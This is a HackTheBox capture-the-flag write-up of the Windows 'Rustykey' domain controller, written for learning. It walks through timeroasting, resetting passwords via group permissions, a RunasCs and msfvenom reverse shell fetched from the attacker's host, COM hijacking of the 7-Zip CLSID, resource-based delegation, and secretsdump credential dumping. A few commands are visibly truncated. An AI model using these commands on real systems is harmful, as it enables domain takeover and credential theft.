# HackTheBox Writeup: Rustykey

**Difficoltà:** Hard
**OS:** Windows
**Date:** 21/03/2026

## 1. Information Gathering & Reconnaissance
IP target: 10.129.232.127
Credentials: rr.parker:8#t5HE8L!W3A

### Port Scanning
We begin by mapping the open ports and services on the target using Nmap:

`nmap -sCV -vv -oA nmap/rustykey 10.129.232.127`

<img width="1236" height="699" alt="image" src="https://github.com/user-attachments/assets/6493c81a-e533-45f9-891e-18b5f2a3354a" />

Ports 80 and 443 are closed, meaning there is no web server hosted here. However, standard Active Directory/Domain Controller ports are open: DNS (53), RPC (135), LDAP (389, 3268), SMB (445), and WinRM (5985). We will proceed by enumerating these specific services.

### Clock Synchronization (Kerberos Requirement)

Kerberos includes a timestamp-based anti-replay mechanism: each ticket (TGT, TGS) contains the generation time. When the Key Distribution Center (KDC) receives a request, it compares the ticket's timestamp with its own internal clock. If the difference exceeds 5 minutes, the Domain Controller rejects the ticket with a `KRB_AP_ERR_SKEW` error. 

To ensure our attacks work correctly, we sync our local clock with the DC:

`sudo ntpdate 10.129.232.127`

<img width="716" height="37" alt="image" src="https://github.com/user-attachments/assets/262e2512-6275-411d-bdbe-0a0a51f542ca" />

## 2. Enumeration & Initial Access
### SMB & Authentication Mechanisms
We attempt to validate our provided credentials over SMB using NetExec (nxc):

`nxc smb 10.129.232.127 -u r.parker -p '8#t5HE8L!W3A'`

The output indicates that **NTLM authentication is disabled**. Therefore, we must rely entirely on Kerberos for authentication. Additionally, SMB signing is set to `True`, which mitigates any potential NTLM Relay attacks.
<img width="930" height="79" alt="image" src="https://github.com/user-attachments/assets/769997ef-1e4f-46f9-b700-093052548041" />

To interact with Kerberos properly, our Linux system needs to know how to reach the realm. We can generate a custom Kerberos configuration file (`krb5.conf`) and export it to our environment:

`nxc smb 10.129.232.127 --generate-krb5-file rustykey.krb`

<img width="932" height="105" alt="image" src="https://github.com/user-attachments/assets/fcbc802f-f504-4b53-a9d8-9d27cc0e2a44" />

`sudo cp rustykey.krb /etc/krb5.conf`

<img width="333" height="38" alt="image" src="https://github.com/user-attachments/assets/dc0ba6dc-c5ea-4c07-9efc-4acf98f32470" />

Now, we can verify if our credentials are valid using Kerberos authentication (`-k` flag):
`nxc smb 10.129.232.127 -u r.parker -p '8#t5HE8L!W3A' -k`

<img width="938" height="95" alt="image" src="https://github.com/user-attachments/assets/c9c43de7-5ada-438f-8e97-88fe5a5a86e7" />

Let's list the SMB shares that are accessible to Parker to understand his access level in the domain. 

`nxc smb 10.129.232.127 -u rr.parker -p '8#t5HE8L!W3A' -k  --shares`

<img width="940" height="209" alt="image" src="https://github.com/user-attachments/assets/5a0d9e45-3bd7-475d-96ac-e342eef2ac94" />

We don't find any immediately exploitable or interesting SMB shares. To understand Parker's access level in the domain, we need to map the Active Directory environment.
<img width="1439" height="767" alt="image" src="https://github.com/user-attachments/assets/5d1a18d9-e003-4986-90a4-b1668607bc10" />

### Active Directory Enumeration (BloodHound)

When standard queries don't yield obvious paths, writing custom Cypher queries is essential. The following query helps identify direct permissions that users and computers have over other domain objects:

`MATCH p=(source)-[r]->(target)
WHERE (source:Computer or source:user)
AND type(r)<> 'MemberOf'
return p`

<img width="1397" height="405" alt="image" src="https://github.com/user-attachments/assets/075d3c45-cf2b-44bf-972b-135e37a10164" />

The key point we can see are: 1)IT-Computer 3 has the "AddSelf" permission for the HelpDesk group. 2)IT-Computer 3 was created on December 26, and its password was changed on December 27. Computer objects dont work that way, the password changes every 30 day. Now let's take a look at the HelDesk group.

## 3. Lateral Movement & Privilege Escalation
### Time Roasting Attack

<img width="1250" height="621" alt="image" src="https://github.com/user-attachments/assets/4fd1bb93-98c7-4e56-ab59-ef7e1b42eaec" />

By doing lateral movment, we can find some users who connect via winrm.

<img width="1769" height="454" alt="image" src="https://github.com/user-attachments/assets/4e681800-f17d-4203-bc7e-bd1382d8c218" />

First, we need to take control of the machine account. There are two methods: if it is configured with "legacy" authentication (pre-Windows2000), the password may be the same as the computer name. Review the account history to identify human errors (in our case, the password was changed by an administrator, so it will be weak).

## Time Roasting Attack
This attack sends a malformed NTP (Network Time Protocol) request to the domain controller on behalf of the computer account. The server responds with timestamp is encrypted using the account's NTLM hash. 

`nxc smb 10.129.232.127 -M timeroast`

<img width="1596" height="322" alt="image" src="https://github.com/user-attachments/assets/596dbb93-3b8e-4ae8-9bc4-5c2e1ad272c6" />

Now let's add the computer to the HelpDesk group

`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember HelpDesk 'IT-COMPUTER3$' `

<img width="672" height="44" alt="image" src="https://github.com/user-attachments/assets/ebf19a01-5aa9-4b12-8ec2-8ec7a7a9e6b6" />

Next, we'll change the password for the user bb.morgan
`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password bb.morgan 'GiorginaDellaGarbatella!'`

<img width="662" height="45" alt="image" src="https://github.com/user-attachments/assets/4a9131f3-c39f-4ee7-af87-fb7e453f96ef" />

When we try to request a TGT ticket, we get an error because the user is in the Protected Users group.
More info: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

`impacket-getTGT rustykey.htb/bb.morgan:'GiorginaDellaGarbatella!' -dc-ip 10.129.232.127`

<img width="766" height="76" alt="image" src="https://github.com/user-attachments/assets/17b4abee-1e86-4d0a-8ace-9736a0ed13d1" />

To bypass this group, we need to remove Morgan from it.

`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'`

<img width="943" height="67" alt="image" src="https://github.com/user-attachments/assets/0ba34bcd-8f75-42b6-abfe-6aca35a4f930" />

Now we can request TGT ticket for Morgan.

`impacket-getTGT rustykey.htb/bb.morgan:'GiorginaDellaGarbatella!' -dc-ip 10.129.232.127`

When we access the system via WinRM, we find a PDF file. The keywords in it are "extraction/compression", which clearly indicates software for managing archives (zip, rar). Windwows uses COM objects to allow different programs to share functionality. For example, when you  right-click and select “Extract”, wndows doesn't natively know how to unzip it. Instead, it consults the Registry by looking for a unique code called CLSID. The CLSID tells it: "To openthis file, load this specific DLL". So, if we can identify which CLSID is used for zip file and have the permissions to modify uts value in the registry, we can replace the path to the legitimate DLL with that of a malicius DLL.

<img width="752" height="372" alt="image" src="https://github.com/user-attachments/assets/3b70c224-a49e-4093-8420-3c71fa818ebc" />

Now we need to find the exact CLSID associated with 7-Zip in the Windows Registry.

`reg query HKCR\CLSID /s /f "zip"`

<img width="629" height="55" alt="image" src="https://github.com/user-attachments/assets/50ad7c0a-98db-43cc-a543-3447cc14f54d" />

Now that we have found the registry key, we need to figure out who has permission to edit it.

`C:\Program Files> Get-Acl -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}" | Format-List`

<img width="1333" height="241" alt="image" src="https://github.com/user-attachments/assets/4d3c0d62-f5b1-47cb-9f4b-42c2d98e7c1b" />

We find that the Support group has full control; the user morgan is not a meber of this group, so they cannot modify the key. Let's check the group members on Bloodhound

<img width="919" height="253" alt="image" src="https://github.com/user-attachments/assets/96a30e2c-4b58-4e33-ad55-2970d945f932" />

Now we need to take control of EE.REED. So we have to do the sames as with morgan:

` bloodyAD -d rustykey.htb --host dc.rustykey.htb -u '-COMPUTER3$'`

` bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'noIBombardamentiOggi!'`

`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u ed Objects' 'Support'`

<img width="1124" height="224" alt="image" src="https://github.com/user-attachments/assets/eabfd0e7-f9bf-477f-beb5-dba0f05e2816" />

Later, I tried requesting a TGT for REED and got it, but I couldn't figure out why I still couldn't connect via WinRM. I realized that this user had some restrictions.I used RunasCs to perform pivoting on REED. Since the standard WinRM shell does not support interactive prompts for user switching, RunasCs allowed me to provide ee.reed’s credentials via the command line and establish a new reverse shell within its security context.


`python3 -m http.server`

`wget http://10.10.14.142:8000/runascs.exe -o runascs.exe`

`rlwrap nc -lvnp 9001`

`.\runascs.exe ee.reed 'ComeSonoIBombardamentiOggi!' powershell -r 10.10.14.142:9001`

<img width="533" height="146" alt="image" src="https://github.com/user-attachments/assets/2e1580c2-80a8-4e97-8e00-551d7b9ac7bc" />

Now we need to create our malicious DLL

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.142 LPORT=9001 -f dll -o rev.dll`

`python3 -m http.server `

`wget http://10.10.14.142:8000/rev.dll -o rev.dll`

## COM Hijacking 
Now for the most important part: edit the path stored in the InprocServer32 registry key (under the 7-Zip CLSID), changing the default value from the original DLL to C:\ProgramData\rev.dll.
`Set-ItemProperty -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "" -Value "C:\ProgramData\rev.dll"`

By replacing the value of the InprocServer32 subkey (which normally points to the program’s legitimate DLL) with the path to an arbitrary DLL of mine located in C:\ProgramData, I ensured that the system loads and executes my malicious code every time the COM object is called by a process with higher privileges (such as Windows Explorer or a scheduled administrator task).

<img width="539" height="220" alt="image" src="https://github.com/user-attachments/assets/571ca21a-5986-4138-91a5-35f28f30a7ab" />

We've gained a Turner user shell; let's see what we can do with it using Bloodhound

<img width="805" height="328" alt="image" src="https://github.com/user-attachments/assets/49554540-dab3-4fd1-bea1-cf6faa52148d" />

Turner is part of the Delegation Manager group, which has a special permission called “AllowedToAct” directly on the Domain Controller (DC) object.This allows an attacker to carry out an advanced attack known as Resource-Based Constrained Delegation (RBCD). In short, this attack allows the attacker to tell the domain controller: “Hey, from now on, you have to trust the ‘IT Computer 3’ account”

`Get-ADUser administrator -Properties *`

I tried to see if we could impersonate the Administrator account, but it's set to: AccountNotDelegated:True

`Get-ADUser backupadmin -Properties *`

AccountNotDelegated:False. Since we don't have credentials, we have to do everything through PowerShell, and I can't use Impacket. So we need to create a computer because when we create it, we can specify the password. But now that I think about it, in this case we don't need to create a computer because we already have IT-Computer3

`Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$`

`et-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount`

<img width="782" height="219" alt="image" src="https://github.com/user-attachments/assets/4993a715-45d5-4583-8b04-7cc49e94e463" />

Now that computer3 is authorized to delegate, it can create Kerberos tickets that the RustyKey domain can trust.

`getST.py 'rustykey.htb/IT-COMPUTER3$:Rusty88!' -spn 'cifs/dc.rustykey.htb' -impersonate backupadmin`

<img width="855" height="160" alt="image" src="https://github.com/user-attachments/assets/d1fdb30f-8266-4b2f-a675-1effba6237d3" />




`KRB5CCNAME=backupadmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache secretsdump.py -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'`
``





